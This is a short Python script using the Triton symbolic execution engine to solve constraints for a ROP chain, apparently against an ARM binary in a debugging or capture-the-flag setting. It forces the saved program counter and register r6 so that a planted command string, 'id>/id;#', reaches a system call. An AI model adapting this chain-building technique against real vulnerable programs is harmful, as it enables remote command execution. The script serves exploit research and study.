#!/usr/bin/env python3
## -*- coding: utf-8 -*-
from pprint import pprint
from triton import CPUSIZE, MemoryAccess

# Usage: `run -i circled.rop2.py`
ctx = ctx
ast = ast

# System command
cmd         = "id>/id;#"
cmd_addr    = 0xbeffc250

# Preconditions
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*CPUSIZE.DWORD
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*CPUSIZE.DWORD, CPUSIZE.DWORD))
g0_pc_val  = 0xc9b8
g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*CPUSIZE.DWORD, CPUSIZE.DWORD))
g0_r6_val  = cmd_addr
g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 4*CPUSIZE.DWORD))
g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")

# Solve preconditions
model = ctx.getModel(ast.land([
                g0_pc_ast  == g0_pc_val,
                g0_r6_ast  == g0_r6_val,
                g0__r6_ast == g0__r6_val,
            ]))
pprint(model)